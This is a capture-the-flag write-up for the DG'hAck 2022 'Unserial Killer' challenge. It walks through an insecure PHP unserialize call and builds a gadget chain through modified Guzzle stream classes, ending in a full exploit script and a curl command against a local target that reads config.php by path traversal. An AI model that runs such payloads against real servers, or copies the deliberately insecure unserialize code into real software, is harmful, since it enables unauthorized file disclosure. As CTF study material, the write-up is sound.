---
layout: post
title: DG'hAck 2022 - Unserial Killer
date: 2023-08-26
categories:
  - Ctf
tags:
  - Linux
  - Deserialization
  - PHP
keywords:
  - ""
  - ""
image: "https://imgcdn.stablediffusionweb.com/2025/10/7/c5d70241-e289-46af-87a9-12f8dc2d07d9.jpg"
author: "zerofrost"
draft: false
---


### Finding a PHP Serialization Gadget Chain
This is a challenge from  DG'hAck 2022 CTF which involves chasing down a pop gadget and building a pop chain to achieve arbitrary file read.


#### Challenge Introduction
Viewing the challenge instance, we find the following page where we can download the source code for the application.
![](/images/Unserial_Killer/Pasted_image_20250826211110.png)

The challenge has three files and one folder
![](/images/Unserial_Killer/Pasted_image_20250826210656.png)


The `config` file has the flag
```c
<?php
$FLAG = "flag{this_is_a_flag}";
```



The `functions` file has the following code
```php
<?php

include_once "config.php";
include_once "vendor/autoload.php";

function download()
{
    $zipfile = __DIR__ . "/app.zip";
    if (file_exists($zipfile)) {
        header("Content-type: application/zip");
        header('Content-Disposition: attachment; filename=' . basename($zipfile));
        header("Content-Length: " . filesize($zipfile));
        header("Pragma: no-cache");
        header("Expires: 0");
        flush();
        readfile($zipfile);
        die();
    }
    return "L'archive des sources n'existe pas." . PHP_EOL;
}

function main()
{
    $message = "";
    if (isset($_REQUEST["data"])) {
        try {
            $decoded = base64_decode($_REQUEST["data"]);
            $data = unserialize($decoded);
        } catch (\Throwable $t) {
            var_dump($t);
        }
    } else {
         $message = "<p>Hackers were able to access our entire system configuration via our web server.</p>" . PHP_EOL .
            "<p>
                Find out how they gained access by auditing the site's sources.</p>" . PHP_EOL .
            "<p>You can download the sources by clicking  <a href='?download=1'>here!</a></p>" . PHP_EOL .
            "<p>Note: The system configuration is located in the config.php file.<p>" . PHP_EOL;
    }
    return $message;
}

function display()
{
    if (isset($_REQUEST['download'])) {
        $message = download();
    } else {
        $message = main();
    }
    return $message;
}

?>
```

> The function has an insecure call to `unserialize($_REQUEST["data"])`

The `vendor` folder has the following  folders
```c
total 44
-rw-rw-r-- 1 ctf ctf  468 Aug 26 16:30 autoload.php
drwxrwxr-x 2 ctf ctf 4096 Jun  7  2022 bin
drwxrwxr-x 2 ctf ctf 4096 Jun  7  2022 composer
drwxrwxr-x 3 ctf ctf 4096 May 24  2022 doctrine
drwxrwxr-x 4 ctf ctf 4096 May 24  2022 guzzlehttp
drwxrwxr-x 3 ctf ctf 4096 May 24  2022 phpdocumentor
drwxrwxr-x 3 ctf ctf 4096 May 24  2022 phpspec
drwxrwxr-x 4 ctf ctf 4096 May 24  2022 psr
drwxrwxr-x 3 ctf ctf 4096 May 24  2022 ralouphie
drwxrwxr-x 9 ctf ctf 4096 May 24  2022 sebastian
drwxrwxr-x 4 ctf ctf 4096 May 24  2022 symfony
```


#### Finding Destruct Calls
Since the application is vulnerable to an insecure deserialization vulnerability, let's look for `__destruct` calls.

> `__destruct` is a magic function in PHP invoked on garbage collection (no references to the instance). It is also executed when an object is destroyed

![](/images/Unserial_Killer/Pasted_image_20250826150841.png)

Checking the `__destruct` function in `FnStream.php`, we see it does not do anything interesting.
```php
public function __destruct()
{
die("Removing FnStream Object");
}
```

However, the file contains other interesting functions that we could leverage in our exploit, for instance `getContents()`. This function could be turned into a gadget that allows reading local files on the server.
```php
    public function getContents()
    {
        $content = "";
        if (isset($this->_fn_getContents) && is_string($this->_fn_getContents)) {
            $file = __DIR__ . $this->_fn_getContents . ".php";
            if ($this->display_content === true) {
                readfile($file);
                echo "Printing interesting file..." . PHP_EOL;
            }
        }
        return $content;
    }

    public function allow_attribute(string $name)
    {
        if (in_array($name, self::$forbidden_attributes, true) === true) {
            $offset = array_search($name, self::$forbidden_attributes, true);
            unset(self::$forbidden_attributes[$offset]);
        }
    }

```

> We will come back to this later.

The next file in our list is `vendor/guzzlehttp/psr7/src/Stream.php`, checking `__destruct`, we find the following 
```php
namespace GuzzleHttp\Psr7;

use Psr\Http\Message\StreamInterface;

/**
 * PHP stream implementation.
 *
 * @var $stream
 */
class Stream implements StreamInterface
{
    /**
     * Resource modes.
     *
     * @var string
     *
     * @see http://php.net/manual/function.fopen.php
     * @see http://php.net/manual/en/function.gzopen.php
     */
    const READABLE_MODES = '/r|a\+|ab\+|w\+|wb\+|x\+|xb\+|c\+|cb\+/';
    const WRITABLE_MODES = '/a|w|r\+|rb\+|rw|x|c/';

    private $stream;
    private $size;
    private $seekable;
    private $readable;
    private $writable;
    private $uri;
    private $customMetadata;




    /**
     * Closes the stream when the destructed
     */
    public function __destruct()
    {
        $this->customMetadata->closeContent($this->size);
    }
```

💡 **Tip**: From the looks of it, `customMetadata` looks like a class, which should contain a function/method `closeContent` that takes a parameter `size`.

Let's check if there is any class file with the  `closeContent` function defined. Hmm, we do not find any, other than our current one.
![](/images/Unserial_Killer/Pasted_image_20250826152315.png)


Therefore , we need to utilize another magic method e.g `__call`



#### Finding the Call Magic Method
##### PHP Magic Methods
- PHP contains a list of  [Magic Methods](https://www.php.net/manual/en/language.oop5.magic.php) such as `__construct()`, `__destruct()`, `__call()`, `__callStatic()`, `__get()`, `__set()`, `__isset()`, `__unset()`, `__sleep()`, `__wakeup()`, `__serialize()`, `__unserialize()`, `__toString()`, `__invoke()`, `__set_state()`, `__clone()`, and `__debugInfo()` which are automatically executed at various stages of class creation and termination:
    - `__construct()`: PHP allows developers to declare constructor methods for classes. Classes which have a constructor method call this method on each newly-created object, so it is suitable for any initialization that the object may need before it is used. [php.net](https://www.php.net/manual/en/language.oop5.decon.php#object.construct)
    - `__destruct()`: The destructor method will be called as soon as there are no other references to a particular object, or in any order during the shutdown sequence. [php.net](https://www.php.net/manual/en/language.oop5.decon.php#object.destruct)
    - `__call(string $name, array $arguments)`: triggered when invoking inaccessible methods in an object context. The `$name` argument is the name of the method being called. The `$arguments` argument is an enumerated array containing the parameters passed to the `$name`'ed method. [php.net](https://www.php.net/manual/en/language.oop5.overloading.php#object.call)
    - `__callStatic(string $name, array $arguments)`: The `$name` argument is the name of the method being called. The `$arguments` argument is an enumerated array containing the parameters passed to the `$name`'ed method. [php.net](https://www.php.net/manual/en/language.oop5.overloading.php#object.callstatic)
    - `__get(string $name)`: `__get()` is utilized for reading data from inaccessible (protected or private) or non-existing properties. [php.net](https://www.php.net/manual/en/language.oop5.overloading.php#object.get)
    - `__set(string $name, mixed $value)`: `__set()` is run when writing data to inaccessible (protected or private) or non-existing properties. [php.net](https://www.php.net/manual/en/language.oop5.overloading.php#object.set)
    - `__isset(string $name)`: `__isset()` is triggered by calling `isset()` or `empty()` on inaccessible (protected or private) or non-existing properties. [php.net](https://www.php.net/manual/en/language.oop5.overloading.php#object.isset)
    - `__unset(string $name)`: `__unset()` is invoked when `unset()` is used on inaccessible (protected or private) or non-existing properties. [php.net](https://www.php.net/manual/en/language.oop5.overloading.php#object.unset)
    - `__sleep()`: `serialize()` checks if the class has a function with the magic name `__sleep()`. If so, that function is executed prior to any serialization. It can clean up the object and is supposed to return an array with the names of all variables of that object that should be serialized. If the method doesn't return anything then **null** is serialized and **E_NOTICE** is issued.[php.net](https://www.php.net/manual/en/language.oop5.magic.php#object.sleep)
    - `__wakeup()`: `unserialize()` checks for the presence of a function with the magic name `__wakeup()`. If present, this function can reconstruct any resources that the object may have. The intended use of `__wakeup()` is to reestablish any database connections that may have been lost during serialization and perform other reinitialization tasks. [php.net](https://www.php.net/manual/en/language.oop5.magic.php#object.wakeup)
    - `__serialize()`: `serialize()` checks if the class has a function with the magic name `__serialize()`. If so, that function is executed prior to any serialization. It must construct and return an associative array of key/value pairs that represent the serialized form of the object. If no array is returned a TypeError will be thrown. [php.net](https://www.php.net/manual/en/language.oop5.magic.php#object.serialize)
    - `__unserialize(array $data)`: this function will be passed the restored array that was returned from __serialize(). [php.net](https://www.php.net/manual/en/language.oop5.magic.php#object.unserialize)
    - `__toString()`: The __toString() method allows a class to decide how it will react when it is treated like a string [php.net](https://www.php.net/manual/en/language.oop5.magic.php#object.tostring)
    - `__invoke()`: The `__invoke()` method is called when a script tries to call an object as a function. [php.net](https://www.php.net/manual/en/language.oop5.magic.php#object.invoke)
    - `__set_state(array $properties)`: This static method is called for classes exported by `var_export()`. [php.net](https://www.php.net/manual/en/language.oop5.magic.php#object.set-state)
    - `__clone()`: Once the cloning is complete, if a `__clone()` method is defined, then the newly created object's `__clone()` method will be called, to allow any necessary properties that need to be changed. [php.net](https://www.php.net/manual/en/language.oop5.cloning.php#object.clone)
    - `__debugInfo()`: This method is called by `var_dump()` when dumping an object to get the properties that should be shown. If the method isn't defined on an object, then all public, protected and private properties will be shown. [php.net](https://www.php.net/manual/en/language.oop5.magic.php#object.debuginfo)


Here we will focus on the `__call` magic method, which is triggered when invoking inaccessible methods in an object context. In our case `closeContent`.  Below is a brief overview of how it works
```php
public function __call(string $name, array $arguments){

}


// IF the following call is made
$obj = new MagicMethodExample();
$result = $obj->someUndefinedMethod('arg1', 42);


// then
// the $name parameter passed to __call is 'someUndefinedMethod'
// the $arguments array contains ['arg1',42]


```

Now let's look for files that utilize this function 
![](/images/Unserial_Killer/Pasted_image_20250826152035.png)

 The  file `vendor/phpspec/prophecy/src/Prophecy/Prophecy/ObjectProphecy.php` contains the following
```php
    public function __call($methodName, array $arguments)
    {
        $arguments = new ArgumentsWildcard($this->revealer->reveal($arguments));

        foreach ($this->getMethodProphecies($methodName) as $prophecy) {
            $argumentsWildcard = $prophecy->getArgumentsWildcard();
            $comparator = $this->comparatorFactory->getComparatorFor(
                $argumentsWildcard, $arguments
            );

            try {
                $comparator->assertEquals($argumentsWildcard, $arguments);
                return $prophecy;
            } catch (ComparisonFailure $failure) {}
        }

        return new MethodProphecy($this, $methodName, $arguments);
    }
```

> Nothing interesting here, let's move on

Looking at the `vendor/guzzlehttp/psr7/src/StreamDecoratorTrait.php` file, we see an implementation of the function
```php
<?php

namespace GuzzleHttp\Psr7;

use Psr\Http\Message\StreamInterface;
use ReflectionMethod;

/**
 * Stream decorator trait
 *
 * @property StreamInterface stream
 */
trait StreamDecoratorTrait
{
    public function __construct(StreamInterface $stream)
    {
        $this->stream = $stream;
    }

	..... SNIP .....
    public function __call($method, array $args) // $method is an array of functions, $args is an array in an array containing strings(parameters)
    {
        $result = null;
        // Requires $this->stream to be set and to be an class object with methods that can be called
        if (is_object($this->stream) && method_exists($this->stream, "decorate")) {
             // in_array(needle, haystack)
             
	        // If the current method is not in allowed methods, then overwrite the  method with the provided custom method
            if (in_array($method, $this->getAllowedMethods()) !== true) {
                $method = $this->custom_method;
            }
            if (is_array($method) !== true) {
                $method = [$method];
            }
            
			// args can be an array holding params e.g array(array('somestring','somethingelse'));
            $args = $args[0]; // remains with array('somestring','somethingelse'
            // stream can be the class e.g FnStream()
			// where method can be an array("close","decorate")
            foreach ($method as $_method) {
                if (is_callable([$this->stream, $_method])) {
                    $arguments = array_shift($args); // return the first item in an array e.g somestring
                    $result = $this->stream->$_method(...$arguments);
                }
            }
        }
        // Always return the wrapped object if the result is a return $this
        return $result === $this->stream ? $this : $result;
    }


    public function getAllowedMethods($filter = array('close'))
    {
        $classReflection = new \ReflectionClass("GuzzleHttp\Psr7\FnStream");
        $methodsReflections = $classReflection->getMethods();
        $methodNames = array_map(function (ReflectionMethod $methodReflection) {
            return $methodReflection->getName();
        }, array_values($methodsReflections));
        $methodNames = array_diff($methodNames, $filter);
        return $methodNames;
    }

```

> Note that the `StreamDecoratorTrait.php` file is a trait file and not a class file


What is a trait? PHP only supports single inheritance, a class can extend only one parent class e.g `class child extends Parent`. But sometimes you want to share some common functionality among many unrelated classes. Traits let you do this by "copying" code into classes that use the trait, avoiding duplication.

> In short, StreamDecoratorTrait acts like a parent class that many other class files can inherit from, we need to find other subclasses that inherit from it. 

Below is an example of a trait
```php
<?php
namespace GuzzleHttp\Psr7;

use Psr\Http\Message\StreamInterface;
use ReflectionMethod;

/**
 * Stream decorator trait
 *
 * @property StreamInterface stream
 */
trait StreamDecoratorTrait
{
    /**
     * @param StreamInterface $stream Stream to decorate
     */
    public function __construct(StreamInterface $stream)
    {
        $this->stream = $stream;
    }
.... SNIP....

}
```

Other PHP files that want to use code in the trait, contain the following code
```php
class CachingStream implements StreamInterface
{
    use StreamDecoratorTrait;

```



In our `__call` function previously, we saw this
```php
(is_object($this->stream) && method_exists($this->stream, "decorate"))
```

This condition requires `$this->stream` to be an object of a class, and it should have the `decorate` method. Let's find a class with this method
![](/images/Unserial_Killer/Pasted_image_20250826171926.png)

Checking the function in `FnStream.php`, it has nothing
```php
public static function decorate(StreamInterface $stream, array $methods)
{
	//TODO: need to decorate this function for christmas
}

```

Since the `__call` we need is in a `trait` and not a class , we can't create an object directly from it. Let's look at other class files in this project that rely on or use the trait
![](/images/Unserial_Killer/Pasted_image_20250826170453.png)

Here we see a couple of files, we will focus on the `CachingStream.php` file 

To Reflect:
* We found an insecure deserialization vulnerability that allows us to call the `__destruct` method in the `Stream.php` file. The method requires a `customMetadata` (which should point to another `$secondclass`) whose `closeContent()` function is called.
* The `__destruct` method the allows calling a non-existing method `closeContent`. Therefore, we search for a `__call` method which we find in `StreamDecoratorTrait.php`
* The DecoratorTrait can not be instantiated directly , therefore we need to find a class file that inherits from it, i.e `CachingStream.php`


#### Setting Parameters for FnStream method Calls
Back to the `__call` magic method in `StreamDecoratorTrait.php`, 
```php
<?php

namespace GuzzleHttp\Psr7;

use Psr\Http\Message\StreamInterface;
use ReflectionMethod;

/**
 * Stream decorator trait
 *
 * @property StreamInterface stream
 */
trait StreamDecoratorTrait
{
    public function __construct(StreamInterface $stream)
    {
        $this->stream = $stream;
    }

	..... SNIP .....
    public function __call($method, array $args) // $method is an array of functions, $args is an array in an array containing strings(parameters)
    {
        $result = null;
        // Requires $this->stream to be set and to be an class object with methods that can be called
        if (is_object($this->stream) && method_exists($this->stream, "decorate")) {
             // in_array(needle, haystack)
             
	        // If the current method is not in allowed methods, then overwrite the  method with the provided custom method
            if (in_array($method, $this->getAllowedMethods()) !== true) {
	            // Overwrite method with our custom method
                $method = $this->custom_method;
            }
            if (is_array($method) !== true) {
                $method = [$method];
            }
            
			// args can be an array holding params e.g array(array('somestring','somethingelse'));
            $args = $args[0]; // remains with array('somestring','somethingelse'
            // stream can be the class e.g FnStream()
			// where method can be an array("close","decorate")
            foreach ($method as $_method) {
                if (is_callable([$this->stream, $_method])) {
                    $arguments = array_shift($args); // return the first item in an array e.g somestring
                    $result = $this->stream->$_method(...$arguments);
                }
            }
        }
        // Always return the wrapped object if the result is a return $this
        return $result === $this->stream ? $this : $result;
    }
```

To satisfy the `is_object` and `method_exists` condition, we can set `$this->stream` to an `FnStream.php` object. The value of `$method` parameter will be `closeContent` while the `$args` parameter will be an array holding the parameters.  However, the `$args` parameter will be an array inside an array e.g. 
```php

array(
	array("one","two","three");
)
```


We can tell this from the `$args = $args[0];` that takes the first item of the array. After which ` $arguments = array_shift($args);` is also called. `array_shift` is similar to `array=array[1:]` in python, which removes the first item from an array. 

The for each loop `foreach ($method as $_method) {` also hints that the `$method` parameter should be an array. To summarize, what the for each loop does, it takes the first item in the `$method` array and maps it to the first parameter of the `$args` array. e.g.
```php
$method[i] -> $args[i]
```

For instance, assuming `$this->stream == new FnStream()` and `$method = array("allow_attribute")` and `$args=array(array("myattribute"))`, this will be the same as calling the `FnStream()->allow_attribute("myattribute")`. This therefore allows us to call any methods with any parameters in the `FnStream()` class. However, to achieve this we need to set a `$this->custom_method` in our malicious object.

We can draft a quick POC to call `allow_attribute("_fn_getContents")` in `FnStream()` 
```c
<?php
namespace GuzzleHttp\Psr7;
use Psr\Http\Message\StreamInterface;


class FnStream {
	// We will set this as the value of $this->stream
}


trait StreamDecoratorTrait
{
	// Contains the __call function inherited by CachingStream
}


class CachingStream {
	// Use this to set the value of $this->stream and $this->custom_method
	use StreamDecoratorTrait;
    public function __construct() {
        $this->stream = new FnStream();
        // Set the custom_method which is used in the parent class StreamDecoratorTrait
        // Setting this in StreamDecoratorTrait would also work e.g public $custom_method=array();
        $this->custom_method=array("allow_attribute"); // This will hold the methods
    }


}

class Stream{
    public $size=array(
    	array('_fn_getContents'), // This will hold the method parameters
    ); // parameter passed to funcs declared in custom_method
    public $customMetadata; /* SHould be a class*/

    function __construct(){
    	$this->customMetadata = new CachingStream(); /* we call cachingstream which call streamdecoratortrait which has the __call method, which is triggered when cachingStream->closeContent is called, since it does not exist.*/
    }
}



$payload=new Stream();
$serialized = serialize($payload);
print_r($serialized);
$encoded = base64_encode($serialized);
echo "\nMalicious payload:\n";
echo "previous_steps=".urlencode($encoded)."\n";

print_r('curl -X POST http://localhost:5000/index.php -d "data='.($encoded).'" --output -');    


?>
```

> I also added some comments in the php files to help in debugging

![](/images/Unserial_Killer/Pasted_image_20250826221656.png)

#### Bypassing Restrictions in FnStream

To read the flag, we need to call the `getContents` function in `FnStream`
```php

    public function getContents()
    {
        $content = "";
        if (isset($this->_fn_getContents) && is_string($this->_fn_getContents)) {
            $file = __DIR__ . $this->_fn_getContents . ".php";
            if ($this->display_content === true) {
                readfile($file);
                echo "Printing interesting file..." . PHP_EOL;
            }
        }
        return $content;
    }
```

> Also note that this function only allows us to read `.php` files


We can see that it relies on `$this->_fn_getContents` being set. We could set this in our malicious object, however, it is unset by the `__wakeup` magic function, leaving it as null
```php
    public function __wakeup()
    {
        unset($this->_fn_getMetadata);
        unset($this->_fn_close);
        unset($this->_fn_detach);
        unset($this->_fn_eof);
        unset($this->_fn_isSeekable);
        unset($this->_fn_rewind);
        unset($this->_fn___toString);
        unset($this->_fn_seek);
        unset($this->_fn_isWritable);
        unset($this->_fn_write);
        unset($this->_fn_getContents);
        unset($this->_fn_getSize);
        unset($this->_fn_tell);
        unset($this->_fn_isReadable);
        unset($this->_fn_read);
        echo "Disabling easy peasy attributes" . PHP_EOL;
    }

```


The class also has some `forbidden attributes`, as well as some methods that can help us re-introduce the unset variables and whitelist arbitrary attributes
```php
class FnStream implements StreamInterface
{
    /** @var array */
    private $methods;

    private $display_content = false;

    /** @var array Methods that must be implemented in the given array */
    private static $slots = ['__toString', 'close', 'detach', 'rewind',
        'getSize', 'tell', 'eof', 'isSeekable', 'seek', 'isWritable', 'write',
        'isReadable', 'read', 'getContents', 'getMetadata'];

    /**
     * @var string[]
     */
    private static $forbidden_attributes = [
        "_fn___toString",
        "_fn_close",
        "_fn_detach",
        "_fn_getSize",
        "_fn_tell",
        "_fn_eof",
        "_fn_isSeekable",
        "_fn_rewind",
        "_fn_seek",
        "_fn_getContents",
        "_fn_isWritable",
        "_fn_write",
        "_fn_isReadable",
        "_fn_read",
        "_fn_getMetadata"
    ];

    /**
     * @param array $methods Hash of method name to a callable.
     */
    public function __construct(array $methods)
    {
        $this->methods = $methods;

        // Create the functions on the class
        foreach ($methods as $name => $fn) {
            $this->{'_fn_' . $name} = $fn;
        }
    }


    public function register(string $name, $callback)
    // where $name is the attribute to set e.g $this->_fn_getContents
    // and $callback is its value e.g config.php
    {
        if (in_array($name, self::$forbidden_attributes) === true) {
            throw new \LogicException('FnStream should never register this attribute: ' . $name);
        }
        $this->{$name} = $callback;
        $this->methods[] = [$name, $callback];
    }

    /**
     * Authorize an attribute to be set as method callback
     */
    public function allow_attribute(string $name) // where $name is an attribute like _fn_getContents
    {
	    // If the $name is forbidden, remove it from the list
        if (in_array($name, self::$forbidden_attributes, true) === true) {
            $offset = array_search($name, self::$forbidden_attributes, true);
            unset(self::$forbidden_attributes[$offset]);
        }
    }

    /**
     * The close method is called on the underlying stream only if possible.
     */
    public function __destruct()
    {
        die("Removing FnStream Object");
    }


```


To read the flag, we need to :
* Allow a forbidden attribute we want to use e.g `_fn_getContents` using `allow_attribute`
* Register the attribute since now it is no longer forbidden
* Set the value of `$this->_fn_getContents` to point to our `config.php` file
* Set `private $display_content = true;`
* Finally call `getContents` to read the flag.

> A thing to note is, since the current dir is `/unserial_killer/vendor/guzzlehttp/psr7/src/`, we need to traverse back to the root of the challenge to reach `config.php` i.e `/../../../../config`



The final exploit is as follows
```php
<?php
namespace GuzzleHttp\Psr7;
use Psr\Http\Message\StreamInterface;


class FnStream {
    // We will set this as the value of $this->stream
    private $display_content = true;
}


trait StreamDecoratorTrait
{
    // Contains the __call function inherited by CachingStream
}


class CachingStream {
    // Use this to set the value of $this->stream and $this->custom_method
    use StreamDecoratorTrait;
    public function __construct() {
        $this->stream = new FnStream();
        // Set the custom_method which is used in the parent class StreamDecoratorTrait
        // Setting this in StreamDecoratorTrait would also work e.g public $custom_method=array();
        $this->custom_method=array("allow_attribute","register","getContents"); // This will hold the methods
    }


}


 
class Stream{
    // parameter passed to funcs declared in custom_method
    public $size=array(
        array('_fn_getContents'), // This will hold the method parameters for allow_attribute method
        array('_fn_getContents','/../../../../config'), // This will hold the method parameters for register
        array(null), // This will hold the method parameters for getContent
    ); 
    public $customMetadata; /* SHould be a class*/

    function __construct(){
        $this->customMetadata = new CachingStream(); /* we call cachingstream which call streamdecoratortrait which has the __call method, which is triggered when cachingStream->closeContent is called, since it does not exist.*/
    }
}



$payload=new Stream();
$serialized = serialize($payload);
print_r($serialized);
$encoded = base64_encode($serialized);
echo "\nMalicious payload:\n";
echo "previous_steps=".urlencode($encoded)."\n";

print_r('curl -X POST http://172.17.0.2:5000/index.php -d "data='.($encoded).'" --output -');    


?>
```


![](/images/Unserial_Killer/Pasted_image_20250826224902.png)

#### References
* https://www.xanhacks.xyz/p/php-gadget-chain/
* https://swisskyrepo.github.io/PayloadsAllTheThings/Insecure%20Deserialization/PHP/#object-injection
* https://github.com/maxgiraud/DGhack2022/tree/b690db916f1d2d463a9dd535b97523497a6c5198/attachements/unserial_killer
* https://github.com/maxgiraud/DGhack2022/tree/main/attachements
* https://github.com/maxgiraud/DGhack2022

